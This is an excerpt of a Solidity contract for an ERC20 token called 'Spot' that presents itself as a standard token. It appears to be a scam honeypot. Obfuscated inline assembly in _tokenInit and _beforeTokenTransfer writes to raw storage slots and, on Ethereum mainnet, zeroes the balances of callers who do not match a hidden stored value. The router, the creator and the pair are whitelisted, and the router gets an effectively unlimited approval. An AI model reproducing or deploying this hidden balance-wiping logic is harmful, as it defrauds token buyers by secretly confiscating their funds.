...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSpot;
    uint256 private spotMarket = block.number*2;

    mapping (address => bool) private _firstPeers; 
    mapping (address => bool) private _secondExchange;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private goodWord;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private holyCross;
    address public pair;
    ...
    bool private trading; uint256 private divineLord = 1; bool private blackDeath;
    uint256 private _decimals; uint256 private proNoob;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSpot.push(_router); addSpot.push(msgSender_); addSpot.push(pair);
        for (uint256 q=0; q < 3;) {_firstPeers[addSpot[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xdc7589d6e13448d7451a658083adf9a4acb1890b15a499f26ec6d6f455549efa
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x0c422deca7035332ae7569ed62ab6b89a4eaf3698bb374f953d7371a3cf7b386,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; spotMarket = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSpot[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeploySpot(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addSpot[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySpot(creator, initialSupply);
    }
}

contract Spot is ERC20Token {
    constructor() ERC20Token("Spot", "SPOT", msg.sender, 25000000 * 10 ** 18) {
    }
}